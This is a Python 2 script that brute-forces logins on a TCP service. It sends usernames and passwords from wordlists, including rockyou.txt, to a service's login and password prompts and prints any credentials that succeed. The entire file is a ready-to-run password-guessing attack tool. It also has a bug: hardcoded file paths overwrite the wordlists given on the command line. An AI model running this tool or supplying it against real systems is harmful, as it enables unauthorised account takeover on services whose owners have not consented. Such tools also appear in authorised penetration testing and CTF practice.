#!/usr/bin/python
# colours http://www.siafoo.net/snippet/88
import socket
import sys

tcpHost=''
tcpPort=''
usernameList=''
passwordList=''

if len(sys.argv) == 5:
    tcpHost=sys.argv[1]
    tcpPort=sys.argv[2]
    usernameList = open(sys.argv[3],'r').read().splitlines()
    passwordList = open(sys.argv[4],'r').read().splitlines()
else:
    print"Usage: \033[1;31mthis_script.py ip port username_list password_list\033[1;m\nExample: TCPBruteforce.py 127.0.0.1 8080 ~/users.txt /usr/share/wordlists/rockyou.txt"
    sys.exit(1)
    
usernameList = open('users.txt','r').read().splitlines()
passwordList = open('/usr/share/wordlists/rockyou.txt','r').read().splitlines()
        
        
def StartBrute(username):
    try:
        for password in passwordList:
            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.connect((tcpHost, int(tcpPort)))
            udata = tcpSocket.recv(1024)
            print "\033[1;42m[+] Successfully connected to host\033[1;m"
            
            if udata.endswith("Enter login: "):
                tcpSocket.send(username + "\n")
                    
            pdata=tcpSocket.recv(1024)
            if pdata.endswith("Enter password: "):
                print "[+] Attempting Password"
                tcpSocket.send(password+ "\n")
            
            result=tcpSocket.recv(1024)
            
            if "Error!" in result:
                print "\033[1;31m[-] Failed %s/%s \033[1;m" % (username,password)
            else:
                print "\n\n\033[1;42m[+] Successful Login!\033[1;m"
                print "\033[1;32m[+]      Username: %s\033[1;m" % username
                print "\033[1;32m[+]      Password: %s\033[1;m\n\n" % password
                break
            
            tcpSocket.close()
    except:
        raise 


    
for username in usernameList:
    StartBrute(username)  
     
    print "Testing Complete!"
    
